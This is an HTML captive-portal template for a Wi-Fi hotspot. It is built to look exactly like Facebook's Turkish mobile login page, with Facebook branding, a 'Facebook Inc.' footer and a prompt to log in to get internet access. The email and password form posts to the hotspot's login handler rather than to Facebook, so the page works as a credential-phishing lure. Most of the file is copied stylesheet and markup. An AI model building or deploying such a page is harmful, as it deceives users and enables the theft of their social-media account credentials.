}
i.img u {
    position: absolute;
    width: 0;
    height: 0;
    overflow: hidden;
}
u {
    text-decoration: underline;
}
.touch, .touch .btn, .touch .input, .touch button, .touch input, .touch select, .touch textarea {
    -webkit-tap-highlight-color: rgba(0,0,0,0);
}h1, h2, h3, h4, h5, h6 {
    font-size: 1em;
    font-weight: bold;
}

body, p, figure, h1, h2, h3, h4, h5, h6, ul, ol, li, dl, dd, dt {
    margin: 0;
	}
h1 {
    margin-block-start: 0.67em;
    margin-block-end: 0.67em;
    margin-inline-start: 0px;
    margin-inline-end: 0px;
}
.touch #viewport {
    overflow: hidden;
    position: relative;
    width: 100%;
}
.touch ._55wr {
    padding: 8px;
}
.touch ._5ui2 ._5dpw {
    text-align: center;
}
.touch ._5ui3 {
    padding: 6px;
}
.touch ._5ui2 ._5dpw {
    text-align: center;
}
.touch ._7om2 {
    display: -webkit-flex;
}

.touch ._5ui2 ._5dpw {
    text-align: center;
}
.touch ._4g34 {
    flex: 1;
    min-width: 0;
    width: 0;
}
._52jh {
    font-weight: bold;
}
._52jc {
    font-size: 12px;
    line-height: 16px;
}
._52j9 {
    color: #90949c;
}
.touch ._5ui2 ._5dpw {
    text-align: center;
}
.touch ._5ui2 ._5dpw {
    text-align: center;
}
._52jc {
    font-size: 12px;
    line-height: 16px;
}
.touch ._5ui2 ._5dpw {
    text-align: center;
}
._52jc {
    font-size: 12px;
    line-height: 16px;
}
.touch ._5ui2 ._5dpw {
    text-align: center;
}
._5soa ._5rut .other-links {
    padding-bottom: 36px;
    text-align: center;
}
.touch ._55wp {
    padding: 0;
}
._5pkb, ._5pkc {
    margin: 0;
}
ul, ol {
    list-style: none;
}

ul {
    display: block;
    margin-block-start: 1em;
    margin-block-end: 1em;
    margin-inline-start: 0px;
    margin-inline-end: 0px;
    padding-inline-start: 40px;
}
._5soa ._5rut .other-links {
    padding-bottom: 36px;
    text-align: center;
}
._5t3b {
    padding: 12px 0 12px 0;
}
._52jj {
    text-align: center;
}
.touch .medBtn {
    padding: 3px 8px 2px;
}
html .touch .btn {
    line-height: 27px;
}
.touch .btn.btnD.bgb, .touch .btn.btnC, .touch .btn.btnI.bgb, .touch .btn.btnS, .touch .btn.btnN {
    color: #fff;
    text-shadow: 0 -1px 0 rgba(0, 0, 0, .35);
}
html .touch ._5soa ._28le {
    background: #00a400;
    border: none;
    box-shadow: none;
}
.touch ._5t3b a._5t3c {
    height: 36px;
    padding-left: 16px;
    padding-right: 16px;
    padding-top: 5px;
}
.touch ._5ui2 ._5dpw {
    text-align: center;
}
.touch .mfss {
    font-size: 12px;
    line-height: 15px;
}

.fcg {
    color: gray;
}
.touch ._5ui2 ._5dpw {
    text-align: center;
}
._3j87 {
    margin: 0 auto;
}
._1rrd {
    border: 1px solid #3b5998;
    border-radius: 3px;
    color: #3578e5;
    display: block;
    font-size: large;
    height: 18px;
    line-height: 17px;
    text-align: center;
    vertical-align: middle;
    width: 18px;
}
._3j87 .img {
    margin: 3px 0;
}
.sp_r1kll-jZ9y4.sx_b31c7f {
    width: 12px;
    height: 12px;
    background-position: -82px -265px;
}

.sp_r1kll-jZ9y4 {
    background-image: url(/rsrc.php/v3/y3/r/XUEnP94XWKH.png);
    background-size: auto;
    background-repeat: no-repeat;
    display: inline-block;

}
.img {
    border: 0;
    vertical-align: top;
}
._2pie {
    padding-top: 12px;
}
._55x2>*, ._55x2._55x2>* {
    border: rgba(0, 0, 0, .101);
}
._55x2>*, ._55x2._55x2>* {
    border: 1px solid #e5e5e5;
border-radius: 4px;
}
.touch ._27z2 {
    line-height: 20px;
}
.touch ._4u9z {
    padding: 12px;
}
.touch ._56bg {
    -webkit-appearance: none;
    box-sizing: border-box;
    width: 100%;
}
.touch ._4g34 ._5xu4 {
    flex: 1;
    width: 100%;
}
.touch ._52we {
    align-items: center;
}
.touch ._4g33, .touch ._5i2i {
    display: flex;
}
._43mg>span {
    display: inline-block;
    position: relative;
}
._43mh {
    color: #4b4f56;
}
._43mg {
    display: block;
    overflow: hidden;
    text-align: center;
    white-space: nowrap;
}
._43mg>span:before {
    margin-right: 15px;
    right: 100%;
}
._43mg>span:before, ._43mg>span:after {
    background: #ccd0d5;
    content: '';
    height: 1px;
    position: absolute;
    top: 50%;
    width: 9999px;
}
._43mg>span:after {
    left: 100%;
    margin-left: 15px;
}
._43mg>span:before, ._43mg>span:after {
    background: #ccd0d5;
    content: '';
    height: 1px;
    position: absolute;
    top: 50%;
    width: 9999px;
}
._56bf {
    border-radius: 4px;
    overflow: hidden;
}

._55wo {
    background: #fff;
}
script {
    display: none;
}
img {
    border: 0;
    display: inline-block;
    vertical-align: top;
}
</style>
<script id="u_0_b">(function(a){a.__updateOrientation=function(){var b=!!a.orientation&&a.orientation!==180,c=document.body;c&&(c.className=c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g," ")+" "+(b?"landscape":"portrait"));return b}})(window);</script>
</head><body tabindex="0" class="touch x1 _fzu _50-3 iframe acw portrait" style="min-height: 611px; background-color: rgb(255, 255, 255);">
$(if chap-id)
	<form name="sendin" action="$(link-login-only)" method="post">
		<input type="hidden" name="username" />
		<input type="hidden" name="password" />
		<input type="hidden" name="dst" value="$(link-orig)" />
		<input type="hidden" name="popup" value="true" />
	</form>
	<script type="text/javascript" src="/md5.js"></script>
	<script type="text/javascript">
	<!--
	    function doLogin() {
		document.sendin.username.value = document.login.username.value;
		document.sendin.password.value = hexMD5('$(chap-id)' + document.login.password.value + '$(chap-challenge)');
		document.sendin.submit();
		return false;
	    }
	//-->
	</script>
$(endif)
<div id="viewport" data-kaios-focus-transparent="1" style="min-height: 611px;"><h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1><div id="page" class=""><div class="_129_" id="header-notices"></div><div class="_7om2 _52we _52z5" id="header"><div class="_4g34 _52z6" data-sigil="mChromeHeaderCenter"><a href="#"><i class="img sp_r1kll-jZ9y4 sx_871d9c"><u>facebook</u></i></a></div></div><div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane" style="min-height: 611px;"><div class="_7om2"><div class="_4g34" id="u_0_0"><div class="_5yd0 _2ph- _5yd1" style="display: none;" id="login_error" data-sigil="m_login_notice"><div class="_52jd"></div></div><div class="acy apm abb" data-sigil="marea"><span class="mfsm">İnternete bağlanmak için giriş yapmalısın.</span></div><div class="_4-4l"><div id="login_top_banner" data-sigil="m_login_upsell login_identify_step_element"></div><div class="_5rut">
<div align="center">
</div>
<form method="post" name="login" action="$(link-login-only)" class="mobile-login-form _5spm" $(if chap-id) onSubmit="return doLogin()" $(endif)>
						<input type="hidden" name="dst" value="$(link-orig)" />
						<input type="hidden" name="popup" value="true" />
						
<div id="user_info_container" data-sigil="user_info_after_failure_element"></div>
<div id="pwd_label_container" data-sigil="user_info_after_failure_element"></div>
<div id="otp_retrieve_desc_container"></div>
<div class="_56be _5sob">
<div class="_55wo _55x2 _56bf">
<div class="_96n9" id="email_input_container">
<input class="_56bg _4u9z _5ruq _8qtn" style="background-color:#FFF" name="username" placeholder="Cep telefonu numarası veya e-posta" type="text" value="$(username)">

</div>
<div><div class="_1upc _mg8" data-sigil="m_login_password">
<div class="_7om2"><div class="_4g34 _5i2i _52we">
<div class="_5xu4">
<input class="_56bg _4u9z _27z2 _8qtm" name="password" placeholder="Şifre" type="password"></div></div>
<div class="_5s61 _216i _5i2i _52we"><div class="_5xu4">
<div class="_2pi9" style="display:none" id="u_0_1"><a href="#" data-sigil="password-plain-text-toggle">
<span class="mfss" style="display:none" id="u_0_2">GİZLE</span>
<span class="mfss" id="u_0_3">GÖSTER</span></a></div></div></div></div></div></div></div></div>
<div class="_2pie" style="text-align:center;">
<div id="u_0_4" data-sigil="login_password_step_element">
<button type="submit" value="Giriş Yap" class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu"><span class="_55sr">Giriş Yap</span></button>
</div><div class="_7eif" id="oauth_login_button_container" style="display:none"></div><div class="_7f_d" id="oauth_login_desc_container" style="display:none"></div><div id="otp_button_elem_container"></div></div>
<input type="hidden" name="prefill_contact_point" id="prefill_contact_point"><input type="hidden" name="prefill_source" id="prefill_source" value="browser_onload"><input type="hidden" name="prefill_type" id="prefill_type" value="contact_point"><input type="hidden" name="first_prefill_source" id="first_prefill_source" value="browser_onload"><input type="hidden" name="first_prefill_type" id="first_prefill_type" value="contact_point"><input type="hidden" name="had_cp_prefilled" id="had_cp_prefilled" value="true"><input type="hidden" name="had_password_prefilled" id="had_password_prefilled" value="false"><input type="hidden" name="is_smart_lock" id="is_smart_lock" value="false"><div class="_xo8"></div><noscript><input type="hidden" name="_fb_noscript" value="true" /></noscript>

</form>
<script type="text/javascript">
<!--
  document.login.username.focus();
//-->
</script>
<div><div class="_43mg _8qtf"><span class="_43mh">veya</span></div><div class="_52jj _5t3b" id="signup_button_area"><a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable" id="signup-button" tabindex="0" data-sigil="m_reg_button" data-autoid="autoid_3">Yeni Hesap Oluştur</a></div></div><div><div class="other-links _8p_m"><ul class="_5pkb _55wp"><li><span class="mfss fcg"><a tabindex="0" href="#" id="forgot-password-link">Şifreni mi Unuttun?</a></span></li></ul></div></div></div></div></div></div><div style="display:none"><div></div><div></div><div></div></div><span><img src="./login_files/hsts-pixel.gif" width="0" height="0" style="display:none"></span><div class="_55wr _5ui2" data-sigil="m_login_footer"><div class="_5dpw"><div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea"><div class="_7om2"><div class="_4g34"><span class="_52jc _52j9 _52jh _3ztb">Türkçe</span><div class="_3ztc"><span class="_52jc"><a href="#" data-locale="ar_AR" data-sigil="change_language">العربية</a></span></div><div class="_3ztc"><span class="_52jc"><a href="#" data-locale="zz_TR" data-sigil="change_language">Zaza</a></span></div><div class="_3ztc"><span class="_52jc"><a href="#" data-locale="pt_BR" data-sigil="change_language">Português (Brasil)</a></span></div></div><div class="_4g34"><div class="_3ztc"><span class="_52jc"><a href="#" data-locale="ku_TR" data-sigil="change_language">Kurdî (Kurmancî)</a></span></div><div class="_3ztc"><span class="_52jc"><a href="#" data-locale="en_GB" data-sigil="change_language">English (UK)</a></span></div><div class="_3ztc"><span class="_52jc"><a href="#" data-locale="es_LA" data-sigil="change_language">Español</a></span></div><a href="file:///C:/language.php?n=https%3A%2F%2Fm.facebook.com%2Flogin.php%3Fnext%3Dhttps%253A%252F%252Fm.facebook.com%252Fsaved%252Fall%26refsrc%3Dhttps%253A%252F%252Fm.facebook.com%252Fsaved%252Fall&amp;refid=9"><div class="_3j87 _1rrd _3ztd" aria-label="Dillerin tam listesi" data-sigil="more_language"><i class="img sp_r1kll-jZ9y4 sx_b31c7f"></i></div></a></div></div></div><div class="_5ui4"><span class="mfss fcg">Facebook Inc.</span></div></div></div></div><div class=""></div><div class="viewportArea _2v9s" style="display:none" id="u_0_5" data-sigil="marea"><div class="_5vsg" id="u_0_6" style="max-height: 504px;"></div><div class="_5vsh" id="u_0_7" style="max-height: 305px;"></div><div class="_5v5d fcg"><div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>Yükleniyor...</div></div><div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea"><div class="container"><div class="image"></div><div class="message" data-sigil="error-message"></div><a class="link" data-sigil="MPageError:retry">Tekrar Dene</a></div></div></div></div><div id="static_templates"><div class="mDialog" id="modalDialog" style="display:none" data-sigil=" context-layer-root" data-autoid="autoid_1"><div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader"><div class="_7om2 _52we"><div class="_5s61"><div class="_52z7"><button type="submit" value="İptal" class="cancelButton btn btnD bgb mfss touchable" id="u_0_9" data-sigil="dialog-cancel-button">İptal</button><button type="submit" value="Geri" class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="Geri" id="u_0_a" data-sigil="dialog-back-button"><i class="img sp_r1kll-jZ9y4 sx_589b07" style="margin-top: 2px;"></i></button></div></div><div class="_4g34"><div class="_52z6"><div class="_50l4 mfsl fcw" id="m-future-page-header-title" role="heading" tabindex="0" data-sigil="m-dialog-header-title dialog-title">Yükleniyor...</div></div></div><div class="_5s61"><div class="_52z8" id="modalDialogHeaderButtons"></div></div></div></div><div class="modalDialogView" id="modalDialogView"></div><div class="_5v5d _5v5e fcg" id="dialogSpinner"><div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_8" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>Yükleniyor...</div></div></div>













<br><div style="color: #FF8080; font-size: 9px">$(error)</div>$(endif)

</body></html>


